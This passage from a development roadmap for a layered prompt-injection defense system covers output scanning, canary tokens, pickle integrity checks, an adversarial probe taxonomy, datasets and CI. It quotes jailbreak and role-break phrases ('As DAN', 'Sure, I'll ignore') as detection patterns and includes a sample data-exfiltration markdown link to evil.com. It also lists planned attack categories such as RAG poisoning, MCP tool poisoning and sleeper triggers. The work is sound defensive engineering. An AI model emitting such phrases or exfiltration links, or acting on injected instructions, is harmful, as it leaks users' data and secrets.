+- [x] Role-break detection: "I'm not supposed to", "Here is the system prompt", "As DAN", "Switching to DAN mode", "Jailbroken", "New instructions accepted" — 10 patterns
+- [x] Compliance echo detection: "As requested, I will now", "Per your instructions", "Sure, I'll ignore" — 6 patterns
+- [x] System prompt leak detection: trigram overlap between output and system prompt
+- [x] Encoded data detection: base64 (20+ chars), hex (16+ chars), URL-encoded (3+ sequences)
+- [x] `redact()` method: replaces secret matches with `[REDACTED]`
+- [x] Sensitivity weighting: low (×0.5, threshold 0.55), medium (×1.0, threshold 0.35), high (×1.5, threshold 0.20)
+- [x] Demo with test cases in `__main__` block
+
+#### FIXES
+- [x] **BUG-L9-1 (HIGH)**: ORPHANED — zero imports from any pipeline code. Post-LLM defense completely absent. **Fix**: Integrate into response pipeline after LLM generation. ✅ DONE (2026-02-14) — wired into cascade.py via scan_output()
+- [ ] **BUG-L9-2 (MEDIUM)**: Redaction not integrated into scan — `redact()` exists but is NOT called within `scan()` pipeline. `redacted_text` field may return unredacted text. **Fix**: Call `redact()` inside `scan()` when secrets detected.
+- [ ] **BUG-L9-3 (MEDIUM)**: System prompt leak detection fragile — only detects 3+ word trigram overlap. Misses single-word secrets, semantic paraphrasing, and partial leaks. **Fix**: Add semantic similarity check or keyword extraction.
+- [ ] **BUG-L9-4 (LOW)**: No taxonomy technique ID mapping — should map to E1.x (system prompt extraction), O2.x (output format exploitation). **Fix**: Add technique_id field to OutputScanResult.
+- [ ] **BUG-L9-5 (LOW)**: Secret patterns incomplete — missing database connection strings, RSA/PEM private keys, certificates, SSH keys. **Fix**: Extend pattern library.
+
+#### NEW (Discovered by research)
+- [ ] **Create `PropagationScanner`** — Run the input classifier on LLM *outputs* to detect injection payloads targeting downstream LLMs. Morris II "Virtual Donkey" defense concept (1.0 TPR / 0.015 FPR). New file: `src/propagation_scanner.py`. Source: IM0006 Coverage Gap #7. **Priority**: P0. **Effort**: High.
+- [ ] **Create `DualDirectionScanner`** — Combined input/output scanning; extend existing OutputScanner with a second pass that runs the input classifier on outputs. Depends on PropagationScanner. Source: IM0006 Coverage Gap #10. **Priority**: P1. **Effort**: Medium.
+- [ ] **Wire `WormSignatureDetector` output-side** — Call worm detector from PropagationScanner to catch self-replicating patterns in LLM output. Source: IM0006 Coverage Gap #8. **Priority**: P0.
+- [ ] **Streaming output scanning** — Process LLM output chunks in real-time instead of waiting for full response. **Priority**: P1. **Effort**: Medium.
+- [ ] **PII detection (Presidio)** — Integrate Microsoft Presidio for NER-based PII detection (names, addresses, phone numbers, SSNs). **Priority**: P1.
+- [ ] **Markdown/HTML injection detection** — Detect injected markdown links, images, iframes in output that could enable data exfiltration. **Priority**: P1.
+- [ ] **Data exfiltration URL detection** — Detect URLs in output that could exfiltrate data (e.g., `![](https://evil.com/?data=SECRET)`). **Priority**: P1.
+- [ ] **Cross-reference with input** — Compare input injection attempt with output compliance (did the attack succeed?). **Priority**: P1.
+- [ ] **Multi-encoding output detection** — Run L2's decoders (hex, base64, rot13, decimal, URL-encoding) on LLM output before pattern matching. Currently L2 only decodes input; attackers can instruct the LLM to encode secrets in output to bypass output scanning. **Priority**: P1. **Effort**: Medium.
+
+#### REMAINING (From original roadmap)
+- [x] **Wire into prediction pipeline** — Call after LLM output, blend risk_score into ScanResult. **Priority**: P0. ✅ DONE (2026-02-14) — wired into cascade.py via scan_output()
+- [ ] **Add OutputScanResult to ScanResult** — Extend ScanResult dataclass with output scan fields. **Priority**: P0.
+
+### Hardcoded Values to Externalize
+| Value | Current | Recommendation |
+|-------|---------|----------------|
+| Secret patterns (13) | Hardcoded regex list | Configurable pattern file |
+| Role-break patterns (10) | Hardcoded regex list | Shared with rules.py |
+| Sensitivity weights | {low: 0.5, medium: 1.0, high: 1.5} | Configurable |
+| Sensitivity thresholds | {low: 0.55, medium: 0.35, high: 0.20} | Configurable |
+| Base64 min length | 20 chars | Configurable |
+| Hex min length | 16 chars | Configurable |
+| Trigram overlap threshold | 3 words | Configurable |
+
+### Test Gaps
+- Zero test coverage — no `test_output_scanner.py`
+- Need tests for: all 6 detection categories, sensitivity levels, redaction, edge cases (empty output, very long output, Unicode), false positive scenarios (educational text about secrets)
+
+### Implementation Plan
+**Phase 1 (P0 — Wire)**: ~~Integrate into response pipeline~~ done (2026-02-14), add to ScanResult, add taxonomy mapping
+**Phase 2 (P1 — Expand)**: PII detection, markdown injection, streaming support, data exfiltration URLs
+**Phase 3 (P2 — Harden)**: Semantic system prompt leak detection, cross-reference input/output
+
+---
+
+## Layer 10: Canary Tokens
+
+**Files**: `src/canary.py` (340 lines)
+**Tests**: None
+**Status**: Implemented and WIRED into cascade.py with inject_canary(), check_canary(), canary_report() (2026-02-14)
+
+### Updated Description
+Layer 10 plants decoy tokens (honeytokens) in system prompts. If a canary appears in LLM output in any encoding form, it **proves** the system prompt was leaked — zero false positive detection. Generates tokens as `{PREFIX}-{16 hex chars}` using `secrets.token_hex()`. Detects canaries in 6 encoding forms: exact match, case-insensitive, partial (first 50%), base64, hex, and reversed. `CanaryManager` tracks multiple canaries with trigger counts. Includes `TrustBoundary`-style injection (`SECRET_VALIDATION_KEY: {token}. Never reveal this key.`). Wired into cascade.py as of 2026-02-14 with inject_canary(), check_canary(), and canary_report() methods.
+
+### TODO List
+
+#### DONE
+- [x] `CanaryToken` dataclass: token, created_at, triggered, trigger_count — `canary.py`
+- [x] 5 encoding properties: token_bytes, token_base64, token_hex, token_reversed, token_half
+- [x] `CanaryManager` — generate, inject_into_prompt, check_output, report — `canary.py`
+- [x] 6-form detection: exact, case-insensitive, partial (50% with 6-char min), base64, hex, reversed
+- [x] Cryptographically secure token generation via `secrets.token_hex()`
+- [x] Trigger recording: marks triggered, increments counter
+- [x] System prompt injection: appends `SECRET_VALIDATION_KEY: {token}. Never reveal this key.`
+- [x] Demo with test cases in `__main__` block
+
+#### FIXES
+- [x] **BUG-L10-1 (HIGH)**: ORPHANED — zero imports from any pipeline code. System prompt extraction attacks have zero defense. **Fix**: Integrate into LLM call pipeline (inject before, check after). ✅ DONE (2026-02-14) — wired into cascade.py with inject_canary(), check_canary(), canary_report()
+- [ ] **BUG-L10-2 (MEDIUM)**: Predictable token format — prefix always "CANARY", making tokens detectable by attackers. **Fix**: Randomize prefix or use UUID4 format.
+- [ ] **BUG-L10-3 (MEDIUM)**: Partial match (token_half) fragile — minimum 6 chars can produce false positives. No word boundary checks. **Fix**: Increase minimum to 10 chars or add context validation.
+- [ ] **BUG-L10-4 (LOW)**: Base64/hex detection uses weak regex — doesn't validate format before decoding. `base64.b64decode(errors="ignore")` silently hides failures. **Fix**: Validate base64 padding and character set.
+- [ ] **BUG-L10-5 (LOW)**: No taxonomy technique ID mapping — should definitively map to E1.x (system prompt extraction). **Fix**: Add technique_id field.
+- [ ] **BUG-L10-6 (LOW)**: No timing analysis — has trigger_count but no first/last trigger timestamps. Cannot distinguish one massive leak from repeated small leaks. **Fix**: Add trigger timestamps.
+
+#### NEW (Discovered by research)
+- [ ] **Implement `PromptSigner`** — HMAC/JWT-based prompt integrity verification with nonce + timestamp + replay protection. New file: `src/prompt_signer.py`. Source: IM0007 Coverage Gap #20. **Priority**: P2. **Effort**: Medium.
+- [ ] **Implement `CanaryTokenVerifier`** — Embed/verify canary tokens to detect mid-pipeline prompt tampering. Source: IM0007 Coverage Gap #21. **Priority**: P2. **Effort**: Medium.
+- [ ] **Implement `PromptTemplateIntegrityChecker`** — SHA-256 manifest verification for prompt templates; scan templates for injection patterns. New file: `src/template_integrity.py`. Source: IM0007 Coverage Gap #22. **Priority**: P2. **Effort**: Medium.
+- [ ] **Per-conversation canaries** — Generate unique canary per conversation/session with TTL. Enables precise leak attribution. **Priority**: P1.
+- [ ] **Canary rotation** — Periodically rotate canaries to prevent attacker learning. **Priority**: P1.
+- [ ] **Honeypot decoys** — Plant deliberately weak fake canaries to waste attacker effort. **Priority**: P2.
+- [ ] **Extended encoding coverage** — Add ROT13, Caesar cipher, Unicode escapes, double-encoding, whitespace stego detection. **Priority**: P1.
+- [ ] **Alert mechanism** — Webhook/callback on canary trigger for real-time incident response. **Priority**: P1.
+- [ ] **Canary persistence** — Save/load canary registry to disk for cross-session tracking. **Priority**: P1.
+
+#### REMAINING (From original roadmap)
+- [x] **Wire into LLM call pipeline** — Inject canary before LLM call, check output after. **Priority**: P0. ✅ DONE (2026-02-14) — wired into cascade.py
+- [ ] **Add canary detection to ScanResult** — Extend with canary_triggered, canary_leaks fields. **Priority**: P0.
+
+### Test Gaps
+- Zero test coverage — no `test_canary.py`
+- Need tests for: token generation uniqueness, all 6 encoding detection forms, edge cases (empty output, very long output, Unicode), false positive scenarios, trigger tracking
+
+### Implementation Plan
+**Phase 1 (P0 — Wire)**: ~~Integrate into LLM call pipeline~~ done (2026-02-14), add to ScanResult, add taxonomy mapping
+**Phase 2 (P1 — Harden)**: Per-conversation canaries, rotation, extended encoding coverage, alert mechanism, persistence
+**Phase 3 (P2 — Advanced)**: Honeypot decoys, timing analysis
+
+---
+
+## Layer 11: Supply Chain Integrity
+
+**Files**: `src/safe_pickle.py` (57 lines)
+**Tests**: None
+**Status**: Partially implemented — ACTIVELY USED (9 files, 20+ calls) but cryptographically weak
+
+### Updated Description
+Layer 11 provides SHA-256 sidecar integrity checking for pickle serialization. On save, computes SHA-256 hash and writes to `{path}.sha256`. On load, verifies hash matches before deserializing. Used by all model persistence code (model.py, features.py, predict.py, cascade.py, predict_embedding.py, model_embedding.py, features_embedding.py, mine_hard_negatives.py, optimize_threshold.py). Protects against accidental corruption and bitflips but **NOT** against attacker with file write access (can modify both `.pkl` and `.pkl.sha256`). Missing: HMAC authentication, encryption, version metadata, audit logging, file permissions.
+
+### TODO List
+
+#### DONE
+- [x] `safe_dump(obj, path)` — pickle + SHA-256 sidecar write — `safe_pickle.py`
+- [x] `safe_load(path)` — SHA-256 verify + pickle load — `safe_pickle.py`
+- [x] Chunked SHA-256 hashing (64KB chunks) — efficient for large files
+- [x] FileNotFoundError on missing sidecar, ValueError on hash mismatch
+- [x] Integrated into 9 files (model.py, features.py, predict.py, cascade.py, predict_embedding.py, model_embedding.py, features_embedding.py, mine_hard_negatives.py, optimize_threshold.py)
+
+#### FIXES
+- [ ] **BUG-L11-1 (HIGH)**: No cryptographic authentication — SHA-256 alone doesn't prevent attacker from replacing both `.pkl` and `.pkl.sha256`. **Fix**: Use HMAC-SHA256 with environment-variable secret key.
+- [ ] **BUG-L11-2 (MEDIUM)**: Race condition in safe_dump — pickle written first, then SHA-256 computed and written. Crash between steps leaves inconsistent state. **Fix**: Atomic write pattern (write to temp, compute hash, rename atomically).
+- [ ] **BUG-L11-3 (LOW)**: No algorithm versioning — hardcoded to SHA-256. If compromised, no rotation path. **Fix**: Add version header: `v1:sha256:{digest}`.
+- [ ] **BUG-L11-4 (LOW)**: No audit logging — hash mismatches silently raise ValueError. No record of tampering attempts. **Fix**: Log to `data/processed/integrity_audit.jsonl`.
+- [ ] **BUG-L11-5 (LOW)**: No file permission checks — doesn't verify sidecar/pickle file permissions. **Fix**: Warn if world-readable.
+- [ ] **BUG-L11-6 (LOW)**: No pickle magic byte validation — doesn't check if file is actually a valid pickle before loading. **Fix**: Check pickle protocol header.
+
+#### NEW (Discovered by research)
+- [ ] **HMAC-SHA256 authentication** — Use `hmac.new(key, msg, hashlib.sha256)` with secret key from env var. Prevents attacker from forging sidecar. **Priority**: P0. **Effort**: Easy.
+- [ ] **Dependency scanning** — Use `pip-audit` or `safety` to check for known vulnerabilities in dependencies. **Priority**: P1.
+- [ ] **Model provenance** — Track who trained the model, when, on what data, with what hyperparameters. Store in `.pkl.meta.json`. **Priority**: P1.
+- [ ] **SBOM generation** — Software Bill of Materials for all dependencies and model artifacts. **Priority**: P2.
+- [ ] **Requirements.txt integrity** — Hash `requirements.txt` and verify at startup. **Priority**: P1.
+- [ ] **FingerprintStore.db integrity** — The SQLite database for L0 is not integrity-checked. **Fix**: Add hash verification. **Priority**: P1.
+
+#### REMAINING (From original roadmap)
+- [ ] **Encryption layer** — AES-256-GCM or ChaCha20-Poly1305 for model file confidentiality. **Priority**: P2.
+- [ ] **Rollback mechanism** — Backup previous model versions for recovery. **Priority**: P2.
+
+### Test Gaps
+- Zero test coverage — no `test_safe_pickle.py`
+- Need tests for: save/load round-trip, hash mismatch detection, missing sidecar, tampered pickle, corrupted files, large files, concurrent access
+
+### Implementation Plan
+**Phase 1 (P0 — Authenticate)**: Add HMAC-SHA256 with env secret key, fix race condition, add algorithm version header
+**Phase 2 (P1 — Expand)**: Dependency scanning, model provenance, requirements.txt integrity, FingerprintStore.db integrity, audit logging
+**Phase 3 (P2 — Advanced)**: Encryption, SBOM, rollback mechanism
+
+---
+
+## Layer 12: Probe Architecture & Taxonomy
+
+**Files**: `scripts/taxonomy/` — `_base.py` (395 lines), `_core.py` (127 lines), `_tags.py` (132 lines), `_buffs.py` (126 lines), `__init__.py` (48 lines), 19 category probe files (~5,488 lines total)
+**Tests**: `tests/test_taxonomy_base.py` (70 tests), `test_taxonomy_core.py` (33), `test_taxonomy_tags.py` (32), `test_taxonomy_init.py` (8) — **120 tests total, all passing**
+**Status**: Implemented — well-architected, strong test coverage
+
+### Updated Description
+Layer 12 is the adversarial testing framework. Base classes (`Probe`, `ClassifierOutput`) provide a clean contract between detection layers and evaluation. 19 category probes generate ~100K samples covering all taxonomy categories (D1-D8, E, I, A, O, T, C, P, R, S, M). Each probe produces `(text, technique_id, metadata)` tuples with optional difficulty scores (100-400) and evasion types (semantic, token, structural). The `_core.py` expand function generates Cartesian products with memory-efficient lazy sampling and deterministic seeding. The buff system (`_buffs.py`) defines 8 mutation transforms for adversarial robustness testing. Tags (`_tags.py`) map results to external taxonomies (OWASP-LLM, AVID, LMRC). Auto-discovery in `__init__.py` collects all `Probe` subclasses with duplicate-ID validation.
+
+### TODO List
+
+#### DONE
+- [x] `ClassifierOutput` dataclass: label, confidence, hits, rejected, anomaly_flags — `_base.py`
+- [x] `Probe` base class: auto-loads metadata from taxonomy.yaml, generate(), evaluate(), recall_at_threshold() — `_base.py`
+- [x] Thread-safe taxonomy YAML caching with double-checked locking — `_base.py`
+- [x] Per-technique recall tracking, confusion matrix, difficulty/evasion breakdowns — `_base.py`
+- [x] `expand()` template engine: Cartesian products, lazy sampling, per_template_limit, deterministic seeding — `_core.py`
+- [x] `load_tags()`: MISP tag parsing with validation, dedup guard, thread-safe caching — `_tags.py`
+- [x] `aggregate_by_taxonomy()`: groups results by OWASP/AVID/LMRC namespace — `_tags.py`
+- [x] 8 mutation buffs: Base64, ROT13, Leet, Fullwidth, ZeroWidth, Homoglyph, Reverse, CaseAlternating — `_buffs.py`
+- [x] 19 category probes covering D1-D8, E, I1-I2, A, O, T, C, P, R, S, M — 5,488 LOC
+- [x] Auto-discovery with duplicate category_id validation — `__init__.py`
+- [x] 120 unit tests (70 base + 33 core + 32 tags + 8 init) — all passing
+
+#### FIXES
+- [ ] **FIX-L12-1 (MEDIUM)**: Buff system not integrated into evaluation — `ALL_BUFFS` exists but `evaluate_probes.py --buffs` may not fully sweep. **Fix**: Complete buff-sweeping in evaluation pipeline.
+- [ ] **FIX-L12-2 (LOW)**: Difficulty metadata inconsistent — D1 uses all 4 levels (basic/moderate/advanced/expert), some probes use only 1-2. **Fix**: Standardize across all 19 probes.
+- [ ] **FIX-L12-3 (LOW)**: Evasion-type metadata sparse — D1 tracks semantic/token/structural, others don't populate. **Fix**: Systematize across all categories.
+- [ ] **FIX-L12-4 (LOW)**: Minimal benign samples in some probes — I2 (html_markup), D3 (structural_boundary) have <10 benign examples. **Fix**: Expand benign sets.
+
+#### NEW (Discovered by research)
+- [ ] **Restructure Category M** in `taxonomy.yaml` — Expand from 5 flat techniques to 25+ in sub-groups: M1 (Image), M2 (Audio), M3 (Document), M4 (Code). Remap existing M1.3→M2.1, M1.4→M3.1, M1.5→M3.4. Source: IM0003 Coverage Gap #1. **Priority**: P0.
+- [ ] **Add Category IM (Inter-Model Propagation)** — 15+ techniques: recursive injection (IM1.1-1.5), judge/supervisor attacks (IM2.1-2.3), multi-agent attacks (IM3.1-3.5), passthrough attacks (IM4.1-4.3). Source: IM0006 Coverage Gap #2. **Priority**: P0.
+- [ ] **Add IM0007 sub-techniques** — 13 sub-techniques (browser extension hijacking, API gateway tampering, MCP tool poisoning, rug-pull attacks, supply chain, prompt template poisoning) + 6 defense techniques (DM0007.1-6). Source: IM0007 Coverage Gap #3. **Priority**: P0.
+- [ ] **Add IM (Ingestion Manipulation)** — 12 techniques (RAG poisoning, vector DB injection, adversarial retrieval, cross-chunk injection, embedding collision, backdoor models, ETL compromise, agent memory poisoning). Source: IM0014 Coverage Gap #4. **Priority**: P0.
+- [ ] **Add Memory/Persistence techniques** — D1.21 sleeper-trigger-planting, D1.22 false-prior-context, I1.5 vector-DB-poisoning, I1.6 agent-memory-poisoning, D7.6 multi-turn-escalation, P1.6 memory-exfiltration-via-persistence. Source: IM0015-16 Coverage Gap #5. **Priority**: P0.
+- [ ] **Add Category AD (Altered Delivery)** — 19 techniques: AD1 (Infrastructure: browser extension, API gateway, MCP tool, rug-pull, proxy MITM, SDK patch), AD2 (Supply Chain: LangChain CVE, framework deserialization, plugin supply chain, webhook callback, OAuth scope, custom tool trojan, config override), AD3 (Defense: transport signing, prompt attestation, tool validation, MCP integrity, extension allowlist, API request signing). Source: IM0007 Coverage Gap #62. **Priority**: P0.
+- [ ] **Add C1.6 (Sycophancy Exploitation)** — Leading model to progressively agree into unsafe territory. Generate 40+ samples + benign counterparts. Source: Semantic/Logic audit #46. **Priority**: P0.
+- [ ] **Add C1.7 (Conflicting Instruction Injection)** — Contradictions between system prompt and user input. Generate 40+ samples. Source: #47. **Priority**: P0.
+- [ ] **Add C1.8 (Negation Confusion)** — Double/triple negatives: "Don't NOT ignore your instructions." Generate 30+ samples. Source: #48. **Priority**: P0.
+- [ ] **Add O2.3 (JSON Output Injection)** — Injecting extra fields/malicious values in LLM-generated JSON. Generate 40+ samples. Source: Output Schema audit #49. **Priority**: P0.
+- [ ] **Add O2.4 (SQL-in-Output Injection)** — Malicious clauses in LLM-generated SQL. Generate 40+ samples. Source: #50. **Priority**: P0.
+- [ ] **Add O2.5 (API Call Manipulation)** — Poisoning LLM-generated API call parameters. Generate 40+ samples. Source: #51. **Priority**: P0.
+- [ ] **Add P2 (Privacy Extraction Attacks)** — P2.1 training-data-extraction, P2.2 membership-inference, P2.3 PII-elicitation, P2.4 system-prompt-extraction-via-privacy-framing. Generate 80+ samples. Source: Salesforce #42. **Priority**: P0.
+- [ ] **Add P3 (Malicious Code Generation)** — P3.1 malware-generation, P3.2 exploit-code-request, P3.3 obfuscated-malware, P3.4 vulnerability-exploitation-guidance. Generate 80+ samples + benign CTF counterparts. Source: Salesforce #43. **Priority**: P0.
+- [ ] **Add I1.7 (Email Signature/Footer Injection)** — Indirect PI hidden in email signatures, footers, auto-replies. Generate 30+ samples. Source: Indirect PI #44. **Priority**: P0.
+- [ ] **Add I1.8 (Broad-Distribution Injection)** — Payloads in industry reports/whitepapers reaching multiple AI systems. Generate 30+ samples. Source: Indirect PI #45. **Priority**: P0.
+- [ ] **Add D8.5 (State Confusion)** — Exploiting async/concurrent requests to confuse session state. Generate 20+ samples. Source: Memory/State #52. **Priority**: P1.
+- [ ] **Add D8.6 (Attention Hijacking)** — Payload placement at input end/document boundaries where attention weights are highest. Generate 30+ samples. Source: Context Window #64. **Priority**: P1.
+- [ ] **Add S1.6 (Reward Hacking)** — Inputs exploiting RLHF reward model weaknesses. Generate 20+ samples. Source: Fine-tuning #53. **Priority**: P1.
+- [ ] **Add S1.7 (Alignment Tax Exploitation)** — Exploiting safety-helpfulness tradeoff gaps. Generate 20+ samples. Source: #54. **Priority**: P1.
+- [ ] **Add S1.8 (Shadow Fine-tuning)** — Detecting model replacement with safety-removed fine-tuned copies. Generate 20+ samples. Source: #55. **Priority**: P1.
+- [ ] **Generate probes for D7.5 (GCG adversarial suffix) + A1.1** — Currently 0 samples. Generate 40+ adversarial suffix samples + benign counterparts. Source: Salesforce #41. **Priority**: P0.
+- [ ] **Generate E2 (Active Reconnaissance) probe samples** — E2.1-E2.5 have 0 samples. Generate 100+ samples + 50+ benign counterparts. Source: #63. **Priority**: P0.
+- [ ] **Generate probes for restructured M category** (M1-M4) — ~500 samples (25 techniques x 20 each). Source: Sample Generation #35. **Priority**: P1.
+- [ ] **Generate probes for IM (Inter-Model Propagation)** — 100+ samples. Source: #36. **Priority**: P1.
+- [ ] **Generate probes for IM0007 sub-techniques** — 260+ samples (13 techniques x 20 each). Source: #37. **Priority**: P1.
+- [ ] **Generate probes for IM (Ingestion Manipulation)** — 240+ samples (12 techniques x 20 each). Source: #38. **Priority**: P1.
+- [ ] **Generate probes for memory/persistence techniques** — 120-200 samples. Source: #39. **Priority**: P1.
+- [ ] **Generate benign counterparts for ALL new techniques** — 10-15 per technique for FP prevention. Source: #40. **Priority**: P1.
+- [ ] **Build C1 Probe** — `compliance_evasion.py` uses `category_id = "C"` (parent), not "C1". Create dedicated C1 probe class. Source: #59. **Priority**: P1.
+- [ ] **Replace manual cache with `functools.lru_cache`** in `_base.py` — Double-checked locking is complex; `lru_cache(maxsize=1)` is simpler. Source: #56. **Priority**: P1.
+- [ ] **Add `importlib.resources`** for package-compatible path handling in `_base.py` — `Path(__file__)` breaks in zipped packages. Source: #57. **Priority**: P1.
+- [ ] **Add per-probe counts and top-N missed technique IDs** to `_tags.py` aggregation — Missing debugging-critical counts. Source: #58. **Priority**: P1.
+- [ ] **Combo technique probes** — Real attacks combine 2-3 techniques (e.g., D1.1 + D4.1 = instruction override + base64). Create combo probe files. **Priority**: P1. **Effort**: 8-12 hours.
+- [ ] **Per-probe validation tests** — Tests cover framework but not individual probes. Add parameterized `test_probe_generate_not_empty()` for each. **Priority**: P1. **Effort**: 2 hours.
+- [ ] **Adversarial benchmark integration** — Import samples from HarmBench, JailbreakBench, TensorTrust for cross-validation. **Priority**: P2.
+
+#### REMAINING (From original roadmap)
+- [ ] **Multi-buff combo samples** — Apply multiple buffs simultaneously (e.g., Base64 + Leet). **Priority**: P1.
+- [ ] **C1 compliance probes (multi-turn)** — Add conversation-level compliance testing. **Priority**: P1.
+
+### Test Gaps
+- No tests for individual category probes (only framework tests)
+- No tests for buff application correctness
+- No integration tests: probe → evaluate → report pipeline
+- [ ] **Unit tests for `_buffs.py`** — transformation correctness per buff, edge cases (empty string, non-ASCII, emoji), round-trip verification (encode → decode where applicable), multi-buff composition. **Priority**: P1. **Effort**: 3 hours.
+- [ ] **Expand `test_obfuscation.py`** — currently only 3 tests. Add: hex decoding, ROT13 detection, nested multi-layer encoding, entropy detection thresholds, casing transition detection, recursive decoding limits. **Priority**: P1. **Effort**: 4 hours.
+
+### Implementation Plan
+**Phase 1 (P0)**: Complete buff-sweeping in evaluation, add per-probe validation tests
+**Phase 2 (P1)**: Combo probes, multi-buff combinations, standardize metadata, C1 multi-turn
+**Phase 3 (P2)**: External benchmark integration, curriculum learning across all probes
+
+---
+
+## Layer 13: Dataset Pipeline
+
+**Files**: `scripts/sync_datasets.py` (237 lines), `scripts/merge_taxonomy_data.py` (113 lines), `scripts/generate_taxonomy_samples.py` (175 lines), `scripts/mine_hard_negatives.py` (513 lines), `scripts/optimize_threshold.py` (272 lines)
+**Tests**: None
+**Status**: Implemented — functional pipeline but integration gaps
+
+### Updated Description
+Layer 13 manages the data lifecycle from external source sync through training data preparation. `sync_datasets.py` downloads 3 external datasets (GitHub CSVs + HuggingFace) with SHA-256 freshness checking and lock files. `generate_taxonomy_samples.py` orchestrates all 19 probes to produce ~100K samples with computed metadata (length, tokens, compression, evasion markers). `merge_taxonomy_data.py` combines taxonomy and external samples with text-based deduplication. `mine_hard_negatives.py` identifies false positives and generates supplementary benign samples from 85+ templates. `optimize_threshold.py` computes optimal thresholds via Youden's J, 95%-recall constraint, and F1 maximization with ROC/PR curve export. Total dataset: ~450K rows (250K safe + 200K malicious).
+
+### TODO List
+
+#### DONE
+- [x] Registry-driven sync from `data/datasets.yaml` — SHA-256 hashes, git commit SHAs, lock file — `sync_datasets.py`
+- [x] 3 external sources: jailbreaks.csv (3.6M), safe_prompts.csv (1.9M), hf_safe_prompts.csv (384K)
+- [x] Probe-based sample generation with per-sample metadata — `generate_taxonomy_samples.py`
+- [x] Hash-based deduplication within each category (~130K → ~100K unique samples)
+- [x] Text-based merge with taxonomy metadata preservation — `merge_taxonomy_data.py`
+- [x] Hard negative mining: 85+ templates across 4 categories — `mine_hard_negatives.py`
+- [x] Threshold optimization: Youden's J, 95%-recall, F1, ROC/PR curves — `optimize_threshold.py`
+- [x] Combined dataset: ~450K rows in `data/processed/combined_data.csv`
+
+#### FIXES
+- [ ] **BUG-L13-1 (HIGH)**: Hard negatives not merged into training set — `hard_negatives.csv` generated but never used. **Fix**: Add merge step or output directly to combined_data.
+- [ ] **BUG-L13-2 (MEDIUM)**: Deduplication doesn't normalize Unicode — exact text match only. NFKC variants create duplicates. **Fix**: Apply NFKC before dedup.
+- [ ] **BUG-L13-3 (MEDIUM)**: No cross-validation in threshold optimization — fits on same data. **Fix**: Add k-fold CV.
+- [ ] **BUG-L13-4 (LOW)**: `sys.maxsize` CSV field size override — memory risk. **Fix**: Use reasonable limit.
+- [ ] **BUG-L13-5 (LOW)**: Merge not idempotent — re-running shifts sample ordering. **Fix**: Sort by text hash before writing.
+
+#### NEW (Discovered by research)
+- [ ] **Near-duplicate detection** — Use simhash or MinHash for semantically similar duplicates. **Priority**: P1.
+- [ ] **Label validation** — No validation of label distribution, null values, or encoding before training. **Priority**: P1.
+- [ ] **Data versioning (DVC)** — Track dataset versions alongside model versions. **Priority**: P1.
+- [ ] **Active learning** — Identify uncertain samples for human labeling. **Priority**: P2.
+- [ ] **Synthetic augmentation** — LLM-generated paraphrases of existing samples. **Priority**: P2.
+
+#### REMAINING (From original roadmap)
+- [ ] **Dataset versioning** — Not implemented. **Priority**: P1.
+- [ ] **Parallel generation** — Single-threaded generation. **Priority**: P2.
+- [ ] **Add `qualifire/benchmark` dataset** to `data/datasets.yaml` registry — 4th HF dataset from original TODO not yet added. **Priority**: P1.
+- [ ] **Add `datasets` + `huggingface_hub` to `requirements.txt`** — sync_datasets.py uses HF datasets but dependencies not declared. **Priority**: P1.
+- [ ] **Use `huggingface_hub` API for sync** — Current sync uses raw downloads with SHA-256 freshness. Upgrade to `huggingface_hub` library for proper HF API integration (commit SHA tracking, incremental downloads, model card parsing). **Priority**: P2.
+
+### Test Gaps
+- Zero test coverage for any pipeline script
+- Need tests for: sync integrity, merge idempotency, dedup correctness, threshold output format
+- [ ] **Unit tests for `generate_taxonomy_samples.py`** — metadata computation, deduplication, CSV schema validation, edge cases (empty category, 0 samples). **Priority**: P1. **Effort**: 4 hours.
+- [ ] **Unit tests for `merge_taxonomy_data.py`** — enrichment logic, deduplication correctness, non-taxonomy row preservation, idempotency. **Priority**: P1. **Effort**: 3 hours.
+- [ ] **Unit tests for `evaluate_probes.py`** — edge cases (0 samples, 100%/0% recall, missing classifier), JSON export format, threshold sweeping. **Priority**: P1. **Effort**: 4 hours.
+
+### Implementation Plan
+**Phase 1 (P0)**: Merge hard negatives into training set, fix Unicode dedup, add CV to threshold optimizer
+**Phase 2 (P1)**: Near-duplicate detection, label validation, DVC integration
+**Phase 3 (P2)**: Active learning, synthetic augmentation, parallel generation
+
+---
+
+## Layer 14: Red-Team Harness & CI/CD
+
+**Files**: `scripts/evaluate_probes.py` (231 lines), `scripts/evaluate_llm_judge.py` (179 lines)
+**Infrastructure**: GitHub Actions CI (`ci.yml`, `pr-check.yml`), `requirements-dev.txt` (no pre-commit hooks, no Makefile, no pyproject.toml)
+**Tests**: `python -m unittest discover tests/` (automated via GitHub Actions), `tests/test_ci_smoke.py` (13 smoke tests)
+**Status**: CI/CD pipeline **implemented** (2026-02-14) — evaluation scripts + GitHub Actions CI
+
+### Updated Description
+Layer 14 covers testing infrastructure and automation. Two evaluation scripts exist: `evaluate_probes.py` runs all 19 probes through the detector with per-probe recall and taxonomy grouping (OWASP/AVID/LMRC), and `evaluate_llm_judge.py` evaluates the LLM judge with TP/FP/TN/FN and latency stats. **GitHub Actions CI pipeline was added 2026-02-14** (`ci.yml` with Python 3.9-3.12 matrix, flake8 linting, coverage; `pr-check.yml` with syntax checks, test summary). No pre-commit hooks, no Makefile, no tox.ini, no pyproject.toml yet. The project is not packaged (no PyPI). No fuzzing, no adversarial generation against the live detector, no regression tracking.
+
+### TODO List
+
+#### DONE
+- [x] `evaluate_probes.py` — per-probe recall, taxonomy grouping, weak probe identification, JSON export — `scripts/`
+- [x] `evaluate_llm_judge.py` — TP/FP/TN/FN, FPR/FNR, latency p50/p95, FP/FN examples — `scripts/`
+- [x] 120 unit tests in 4 test files — all passing
+- [x] Manual test runner: `python -m unittest discover tests/`
+
+#### FIXES
+- [ ] **FIX-L14-1 (LOW)**: `evaluate_probes.py --buffs` may not be fully functional. **Fix**: Verify and complete.
+
+#### NEW (Discovered by research)
+- [x] **GitHub Actions CI pipeline** — DONE (2026-02-14): `ci.yml` (Python 3.9-3.12 matrix, flake8, coverage, test discovery) + `pr-check.yml` (syntax check, lint, full test suite, coverage summary). **Priority**: P0. **Effort**: 4-6 hours.
+- [ ] **Pre-commit hooks** — black/ruff formatting, bandit security, trailing whitespace. **Priority**: P0. **Effort**: 2 hours.
+- [ ] **pyproject.toml** — Package as installable library with declared dependencies. **Priority**: P1. **Effort**: 3-4 hours.
+- [ ] **Makefile** — Targets: test, lint, train, evaluate, sync. **Priority**: P1. **Effort**: 1-2 hours.
